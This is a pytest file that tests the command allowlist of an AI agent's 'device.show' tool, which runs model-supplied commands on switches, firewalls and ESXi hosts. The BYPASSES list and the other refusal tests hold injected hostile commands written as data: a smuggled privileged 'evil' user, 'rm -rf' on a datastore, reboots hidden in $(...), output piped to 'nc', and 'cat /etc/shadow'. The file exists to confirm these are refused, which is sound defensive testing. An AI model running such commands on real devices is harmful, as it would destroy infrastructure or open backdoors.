"""Observability tool tests. The allowlist is the interesting one: `device.show`
must refuse anything that could return a raw config or a secret, and must refuse
it *before* it opens a session to the device.
"""

from __future__ import annotations

import json
from typing import Any

import pytest

from infra_agent.config import Settings
from infra_agent.models.common import Credential, DeviceKind, SeedDevice, SeedInventory
from infra_agent.redaction.gateway import RedactionGateway
from infra_agent.tools import observability_tools as obs


class FakeHttp:
    def __init__(self, responses: dict[str, Any] | None = None) -> None:
        self.responses = responses or {}
        self.calls: list[tuple[str, dict[str, Any] | None]] = []
        self.error: Exception | None = None

    def get_json(self, url: str, params: dict[str, Any] | None = None) -> Any:
        self.calls.append((url, params))
        if self.error is not None:
            raise self.error
        for key, value in self.responses.items():
            if key in url:
                return value
        return {}


class FakeDeviceTransport:
    def __init__(self, output: Any = None) -> None:
        self.output = output if output is not None else [{"port": "Gi1/0/1", "status": "connected"}]
        self.calls: list[tuple[str, str]] = []
        self.error: Exception | None = None

    def run(self, device: SeedDevice, cred: Credential | None, command: str) -> Any:
        self.calls.append((device.name, command))
        if self.error is not None:
            raise self.error
        return self.output


INVENTORY = SeedInventory(
    devices=[
        SeedDevice(
            name="sw-core-01",
            kind=DeviceKind.cisco_ios,
            mgmt_ip="10.0.0.11",
            credential_ref="sw-core-01",
        ),
        SeedDevice(
            name="fw-01", kind=DeviceKind.fortigate, mgmt_ip="10.0.0.1", credential_ref="fw-01"
        ),
        SeedDevice(
            name="esx-01", kind=DeviceKind.esxi, mgmt_ip="10.0.0.21", credential_ref="esx-01"
        ),
    ]
)


@pytest.fixture
def wired(tmp_path):
    """Point every tool at fakes, and put it back afterwards."""
    settings = Settings(
        data_dir=tmp_path / "data",
        prometheus_url="http://prometheus:9090",
        loki_url="http://loki:3100",
        alertmanager_url="http://alertmanager:9093",
    )
    http = FakeHttp()
    devices = FakeDeviceTransport()
    obs.reset()
    deps = obs.configure(
        settings=settings,
        gateway=RedactionGateway(audit_log=tmp_path / "audit.jsonl"),
        http=http,
        devices=devices,
        inventory=lambda: INVENTORY,
        credentials=lambda device: Credential(username="ro", password="unused"),
    )
    yield deps
    obs.reset()


# -- the device.show allowlist ------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "show running-config",
        "show run",
        "show startup-config",
        "show tech-support",
        "show archive config differences",
        "show version | include secret",
        "show snmp user",
        "show crypto key mypubkey rsa",
        "configure terminal",
    ],
)
def test_cisco_commands_that_could_leak_a_config_are_refused(wired, command):
    result = obs.show(device="sw-core-01", command=command)

    assert result["allowed"] is False
    assert result["error"]
    assert wired.devices.calls == [], "a refused command never opens a session"


# Every one of these is allowed by the platform allowlist as written: the
# regexes match a whitespace-collapsed copy of the command, so an embedded
# newline is swallowed by a trailing `.*`, and the esxcli patterns are prefix
# matches with no verb restriction. `device.show` is the component that turns a
# model string into device execution, so it refuses them itself.
BYPASSES = [
    ("sw-core-01", "show ip route\nconfigure terminal\nvlan 999\nend\nshow ip route summary"),
    (
        "sw-core-01",
        "show mac address-table\nconfigure terminal\n"
        "username evil privilege 15 secret x\nend\nshow mac address-table count",
    ),
    ("esx-01", "esxcli network firewall set --enabled false"),
    ("esx-01", "esxcli network vswitch standard uplink remove -u vmnic0 -v vSwitch0"),
    ("esx-01", "esxcli storage core device set --state=off -d naa.1"),
    ("esx-01", "esxcli network ip interface list; rm -rf /vmfs/volumes/ds1/vm1"),
    ("esx-01", "esxcli system version get; echo pwned > /etc/rc.local.d/local.sh"),
    ("esx-01", "esxcli network ip interface list $(reboot)"),
    ("esx-01", "esxcli network ip interface list `reboot`"),
    ("esx-01", "esxcli system version get && halt"),
    ("esx-01", "esxcli system version get | nc 10.0.0.9 1234"),
]


@pytest.mark.parametrize(("device", "command"), BYPASSES)
def test_a_command_the_allowlist_regexes_let_through_is_still_refused(wired, device, command):
    # Defence in depth: the gateway now refuses these itself (metacharacters, write
    # verbs), and device.show must refuse them independently of the gateway too.
    assert not wired.gateway.is_command_allowed(INVENTORY.get(device).platform, command)

    result = obs.show(device=device, command=command)

    assert result["allowed"] is False
    assert wired.devices.calls == [], "nothing reaches the device"


@pytest.mark.parametrize(
    "command",
    [
        "show version\r\nreload",
        "show version; configure terminal",
        "show version && reload",
        "show version $(reload)",
        "show version\treload",
    ],
)
def test_a_command_carrying_a_second_command_never_runs(wired, command):
    result = obs.show(device="sw-core-01", command=command)

    assert result["allowed"] is False
    assert wired.devices.calls == []


def test_a_refused_command_is_reported_in_its_normalised_form(wired):
    result = obs.show(device="sw-core-01", command="show version\nconfigure terminal")

    assert result["allowed"] is False
    assert "\n" not in json.dumps(result["command"])
    assert result["command"] == "show version configure terminal"
    assert wired.devices.calls == [], "nothing was run, whatever the string said"


def test_only_the_normalised_command_reaches_the_device(wired):
    result = obs.show(device="sw-core-01", command="  show    interfaces   status  ")

    assert result["allowed"] is True
    assert result["command"] == "show interfaces status"
    assert wired.devices.calls == [("sw-core-01", "show interfaces status")]


@pytest.mark.parametrize(
    "command",
    [
        "esxcli network ip interface list",
        "esxcli system version get",
        "esxcli storage core device list",
        "esxcli software vib list",
        "esxcli hardware platform get",
        "vim-cmd vmsvc/getallvms",
        "vim-cmd hostsvc/hostsummary",
    ],
)
def test_read_only_esxi_commands_still_run(wired, command):
    result = obs.show(device="esx-01", command=command)

    assert result["allowed"] is True, result.get("error")
    assert wired.devices.calls == [("esx-01", command)]


@pytest.mark.parametrize(
    "command",
    [
        "show version",
        "show interfaces status",
        "show vlan brief",
        "show cdp neighbors detail",
        "show mac address-table",
        "show spanning-tree",
        "show ip route",
    ],
)
def test_read_only_cisco_commands_are_allowed(wired, command):
    result = obs.show(device="sw-core-01", command=command)

    assert result["allowed"] is True
    assert wired.devices.calls == [("sw-core-01", command)]


@pytest.mark.parametrize(
    "command",
    [
        "show full-configuration",
        "execute backup config tftp",
        "execute reboot",
        "diagnose debug enable",
        "diagnose sniffer packet any",
        "config system global",
    ],
)
def test_fortigate_commands_that_could_leak_or_change_are_refused(wired, command):
    result = obs.show(device="fw-01", command=command)

    assert result["allowed"] is False
    assert wired.devices.calls == []


@pytest.mark.parametrize(
    "command",
    [
        "esxcli system account list",
        "esxcli system shutdown poweroff",
        "vim-cmd vmsvc/power.off 12",
        "vim-cmd vmsvc/snapshot.create 12",
        "cat /etc/shadow",
    ],
)
def test_esxi_commands_that_change_state_or_read_secrets_are_refused(wired, command):
    result = obs.show(device="esx-01", command=command)

    assert result["allowed"] is False
    assert wired.devices.calls == []


def test_an_unknown_platform_is_refused_by_default(wired):
    inventory = SeedInventory(
        devices=[
            SeedDevice(
                name="ilo-01", kind=DeviceKind.ilo, mgmt_ip="10.0.0.121", credential_ref="ilo-01"
            )
        ]
    )
    obs.configure(inventory=lambda: inventory)

    assert obs.show(device="ilo-01", command="show version")["allowed"] is False


def test_an_unknown_device_is_reported_not_guessed(wired):
    result = obs.show(device="nope-01", command="show version")

    assert "unknown device" in result["error"]
    assert wired.devices.calls == []


def test_device_show_output_is_redacted(wired):
    wired.devices.output = "snmp-server community S3cretC0mmunity RO"

    result = obs.show(device="sw-core-01", command="show version")

    assert "S3cretC0mmunity" not in result["output"]
    assert "<REDACTED>" in result["output"]


def test_a_transport_failure_is_reported_not_raised(wired):
    wired.devices.error = TimeoutError("no route to host")

    result = obs.show(device="sw-core-01", command="show version")

    assert "TimeoutError" in result["error"]
    assert result["allowed"] is True


def test_the_fortios_endpoint_map_only_covers_read_only_endpoints():
    for command, endpoint in obs.FORTIOS_ENDPOINT_MAP.items():
        # `monitor/` is live state; `cmdb/` GET is the read half of the config
        # API. Both are read-only; nothing else may appear here.
        assert endpoint.startswith(("monitor/", "cmdb/")), command
        assert "backup" not in endpoint and "restore" not in endpoint, command


def test_configured_objects_come_from_cmdb_not_from_the_counters():
    """`monitor/firewall/policy` returns hit counters, not the rules the owner wrote."""
    assert obs.FORTIOS_ENDPOINT_MAP["get firewall policy"] == "cmdb/firewall/policy"
    assert obs.FORTIOS_ENDPOINT_MAP["get firewall address"] == "cmdb/firewall/address"
    assert obs.FORTIOS_ENDPOINT_MAP["get firewall vip"] == "cmdb/firewall/vip"
    assert obs.FORTIOS_ENDPOINT_MAP["get system status"] == "monitor/system/status"


def test_the_standalone_60f_is_told_what_an_empty_ha_peer_list_means():
    assert "standalone" in obs.FORTIOS_ENDPOINT_NOTES["get system ha status"]


# -- metrics and logs ---------------------------------------------------------


def test_promql_returns_rows(wired):
    wired.http.responses["/api/v1/query"] = {
        "status": "success",
        "data": {
            "resultType": "vector",
            "result": [
                {"metric": {"__name__": "up", "device": "sw-core-01"}, "value": [1770000000, "0"]}
            ],
        },
    }

    result = obs.promql(query='up{device="sw-core-01"}')

    assert result["row_count"] == 1
    assert result["rows"][0]["labels"]["device"] == "sw-core-01"
    assert result["rows"][0]["value"] == "0"
    assert wired.http.calls[0][1] == {"query": 'up{device="sw-core-01"}'}


def test_promql_reports_an_unreachable_prometheus(wired):
    wired.http.error = ConnectionError("prometheus down")

    result = obs.promql(query="up")

    assert "ConnectionError" in result["error"]
    assert result["query"] == "up"


def test_alerts_active_returns_rows(wired):
    wired.http.responses["/api/v2/alerts"] = [
        {
            "fingerprint": "abc",
            "status": {"state": "active"},
            "labels": {"alertname": "DeviceUnreachable", "device": "esx-01"},
            "annotations": {"summary": "no answer"},
            "startsAt": "2026-02-01T10:00:00Z",
        }
    ]

    result = obs.alerts_active()

    assert result["alert_count"] == 1
    assert result["alerts"][0]["labels"]["alertname"] == "DeviceUnreachable"
    assert result["alerts"][0]["state"] == "active"


def test_logql_returns_the_newest_lines_and_caps_its_arguments(wired):
    wired.http.responses["/loki/api/v1/query_range"] = {
        "data": {
            "resultType": "streams",
            "result": [
                {
                    "stream": {"host": "sw-core-01"},
                    "values": [
                        ["1770000001000000000", "older line"],
                        ["1770000002000000000", "newer line"],
                    ],
                }
            ],
        }
    }

    result = obs.logql(query='{host="sw-core-01"}', minutes=99999, limit=99999)

    assert result["minutes"] == obs.MAX_LOG_MINUTES
    assert result["limit"] == obs.MAX_LOG_LINES
    assert [row["line"] for row in result["lines"]] == ["newer line", "older line"]
    params = wired.http.calls[0][1]
    assert params["direction"] == "backward"
    assert params["end"] > params["start"]


def test_log_lines_are_redacted(wired):
    wired.http.responses["/loki/api/v1/query_range"] = {
        "data": {
            "result": [
                {
                    "stream": {"host": "fw-01"},
                    "values": [["1", 'cfgattr="password[hunter2]" user=admin']],
                }
            ]
        }
    }

    result = obs.logql(query="{}")

    assert "hunter2" not in result["lines"][0]["line"]
    assert "<REDACTED>" in result["lines"][0]["line"]


def test_every_tool_writes_an_egress_audit_entry(wired, tmp_path):
    obs.promql(query="up")
    obs.alerts_active()
    obs.logql(query="{}")
    obs.show(device="sw-core-01", command="show version")

    audited = {
        line.split('"tool": "')[1].split('"')[0]
        for line in (tmp_path / "audit.jsonl").read_text().splitlines()
    }
    assert audited == {"metrics.promql", "metrics.alerts_active", "logs.logql", "device.show"}


# -- registration -------------------------------------------------------------


def test_the_tools_are_registered_and_callable_by_the_model():
    from infra_agent.tools.registry import REGISTRY, load_all

    load_all()
    for name in ("metrics.promql", "metrics.alerts_active", "logs.logql", "device.show"):
        assert name in REGISTRY, name
        assert REGISTRY[name].llm_callable is True
        assert REGISTRY[name].description
    assert REGISTRY["device.show"].parallel_safe is False


# -- the transports themselves ------------------------------------------------


def test_the_fortigate_transport_reuses_one_session_and_labels_the_endpoint(monkeypatch):
    """The 60F gets one poller at >=60s; a tool the model can loop on gets a floor."""
    from types import SimpleNamespace

    import requests

    created: list[Any] = []

    class FakeSession:
        def __init__(self) -> None:
            self.headers: dict[str, str] = {}
            self.verify = True
            self.gets: list[str] = []
            created.append(self)

        def get(self, url: str, timeout: float | None = None) -> Any:
            self.gets.append(url)
            return SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: {"results": [{"policyid": 1, "name": "wan-out"}]},
            )

    slept: list[float] = []
    monkeypatch.setattr(requests, "Session", FakeSession)
    monkeypatch.setattr(obs.time, "sleep", lambda seconds: slept.append(seconds))
    transport = obs.FortiGateShowTransport()
    device = INVENTORY.get("fw-01")
    cred = Credential(token="a-read-only-api-token")

    policies = transport.run(device, cred, "get firewall policy")
    transport.run(device, cred, "get system status")

    assert len(created) == 1, "one TLS session per device, not one per tool call"
    assert created[0].verify is False, "pinning is a Phase 1 decision, not a second policy"
    assert policies["endpoint"] == "api/v2/cmdb/firewall/policy"
    assert policies["results"] == [{"policyid": 1, "name": "wan-out"}]
    assert created[0].gets[1].endswith("/api/v2/monitor/system/status")
    assert slept and slept[0] > 0, "the second call to one device waits"


def test_the_fortigate_transport_says_what_an_empty_ha_peer_list_means(monkeypatch):
    from types import SimpleNamespace

    import requests

    class FakeSession:
        def __init__(self) -> None:
            self.headers: dict[str, str] = {}
            self.verify = True

        def get(self, url: str, timeout: float | None = None) -> Any:
            return SimpleNamespace(raise_for_status=lambda: None, json=lambda: {"results": []})

    monkeypatch.setattr(requests, "Session", FakeSession)
    monkeypatch.setattr(obs, "FORTIGATE_MIN_INTERVAL_SECONDS", 0.0)

    answer = obs.FortiGateShowTransport().run(
        INVENTORY.get("fw-01"), Credential(token="t"), "get system ha status"
    )

    assert answer["results"] == []
    assert "standalone" in answer["note"]


def test_an_unmapped_fortios_command_never_guesses_an_endpoint():
    with pytest.raises(LookupError):
        obs.FortiGateShowTransport().run(
            INVENTORY.get("fw-01"), Credential(token="t"), "get system fortiguard"
        )


def test_ssh_host_keys_are_pinned_when_the_operator_has_recorded_them(monkeypatch):
    monkeypatch.delenv("INFRA_SSH_KNOWN_HOSTS", raising=False)
    assert obs.ssh_known_hosts() is None

    monkeypatch.setenv("INFRA_SSH_KNOWN_HOSTS", "/etc/infra/known_hosts")
    assert obs.ssh_known_hosts() == "/etc/infra/known_hosts"


def fake_paramiko(monkeypatch) -> list[Any]:
    import io

    paramiko = pytest.importorskip("paramiko")
    made: list[Any] = []

    class FakeSSHClient:
        def __init__(self) -> None:
            self.policy: Any = None
            self.loaded: str | None = None
            self.command: str | None = None
            made.append(self)

        def set_missing_host_key_policy(self, policy: Any) -> None:
            self.policy = policy

        def load_host_keys(self, path: str) -> None:
            self.loaded = path

        def connect(self, **kwargs: Any) -> None:
            self.kwargs = kwargs

        def exec_command(self, command: str, timeout: float | None = None) -> Any:
            self.command = command
            return None, io.BytesIO(b"vmnic0 Up 1000\n"), io.BytesIO(b"")

        def close(self) -> None:
            pass

    monkeypatch.setattr(paramiko, "SSHClient", FakeSSHClient)
    return made


def test_the_esxi_transport_rejects_an_unknown_host_key_once_keys_are_recorded(
    monkeypatch, tmp_path
):
    import paramiko

    known = tmp_path / "known_hosts"
    known.write_text("")
    monkeypatch.setenv("INFRA_SSH_KNOWN_HOSTS", str(known))
    made = fake_paramiko(monkeypatch)

    obs.EsxiShowTransport().run(
        INVENTORY.get("esx-01"),
        Credential(username="root", password="x"),
        "esxcli network nic list",
    )

    assert isinstance(made[0].policy, paramiko.RejectPolicy)
    assert made[0].loaded == str(known)


def test_the_esxi_transport_runs_one_normalised_command(monkeypatch):
    monkeypatch.delenv("INFRA_SSH_KNOWN_HOSTS", raising=False)
    made = fake_paramiko(monkeypatch)

    output = obs.EsxiShowTransport().run(
        INVENTORY.get("esx-01"),
        Credential(username="root", password="x"),
        "  esxcli   network   nic   list  ",
    )

    assert made[0].command == "esxcli network nic list"
    assert "vmnic0" in output


def test_an_empty_command_is_refused_before_anything_else(wired):
    result = obs.show(device="sw-core-01", command="   ")

    assert result["allowed"] is False
    assert "no command" in result["error"]
    assert wired.devices.calls == []
